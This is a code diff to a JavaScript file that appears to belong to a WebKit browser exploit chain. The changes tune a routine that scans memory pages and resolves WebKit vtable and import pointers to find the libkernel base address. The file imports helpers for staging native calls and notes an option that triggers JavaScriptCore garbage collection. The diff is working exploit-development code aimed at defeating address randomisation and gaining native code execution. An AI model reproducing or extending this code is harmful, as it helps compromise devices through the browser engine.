@@ -48,12 +48,13 @@ import {
     extPtrToLkCandidates,
     plausibleHeapCell,
     resolveExtPtrSafe,
+    resolveExtListVote,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831n";
+const BUILD_ID = "rw-20250831o";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -478,7 +479,7 @@ const FIND_LK_LITE = {
     knownBatch: 1,
     vtableEntries: 8,
     vtBatch: 1,
-    walkPages: 48,
+    walkPages: 256,
     cellMax: 2,
 };
 const FIND_LK_NORM = {
@@ -491,7 +492,7 @@ const FIND_LK_NORM = {
     knownBatch: 1,
     vtableEntries: 12,
     vtBatch: 2,
-    walkPages: 48,
+    walkPages: 256,
     cellMax: 3,
 };
 
@@ -2026,12 +2027,35 @@ function runVerifyLk() {
     crashLog.flushSync();
 }
 
-function tryResolveExtList(p, off, webkitBase, ext) {
+function tryResolveExtList(p, off, webkitBase, ext, opts) {
+    opts = opts || {};
     if (!p || !ext || !ext.length) return null;
+    const hexes = [];
+    for (let i = 0; i < ext.length; i++) {
+        const h = extPtrHex(ext[i]);
+        if (h) hexes.push(h);
+    }
+    if (hexes.length >= 2) {
+        const voteOpts = Object.assign({ walkPages: opts.walkPages || 256 }, opts);
+        const voted = resolveExtListVote(p, hexes, off, webkitBase, voteOpts);
+        if (voted) {
+            return {
+                hit: voted,
+                from: "vote/" + (voted.vote != null ? voted.vote : "?"),
+                idx: -1,
+                voteRank: voteOpts._voteRank || null,
+            };
+        }
+        if (voteOpts._voteRank && voteOpts._voteRank.length) {
+            mark("LK-VOTE", voteOpts._voteRank.map(function (r) {
+                return r.key.slice(-9) + "x" + r.count;
+            }).join(" "));
+        }
+    }
     for (let i = 0; i < ext.length; i++) {
         const fn = parseAddr(extPtrHex(ext[i]));
         if (!fn) continue;
-        const hit = resolveExtPtrSafe(p, fn, off, webkitBase);
+        const hit = resolveExtPtrSafe(p, fn, off, webkitBase, opts);
         if (hit) return { hit, from: extPtrHex(ext[i]), idx: i };
     }
     return null;
@@ -2116,7 +2140,7 @@ function finishFindLkChunk(chunk) {
             const p = window.p;
             const off = loadEffectiveOff();
             const { webkitBase } = basesFromSession(off);
-            const resolved = tryResolveExtList(p, off, webkitBase, ext);
+            const resolved = tryResolveExtList(p, off, webkitBase, ext, { walkPages: 256 });
             if (resolved) {
                 saveLibkernelSession(resolved.hit.lk, resolved.hit.iatRva);
                 if (addrIn) addrIn.value = String(resolved.hit.lk);
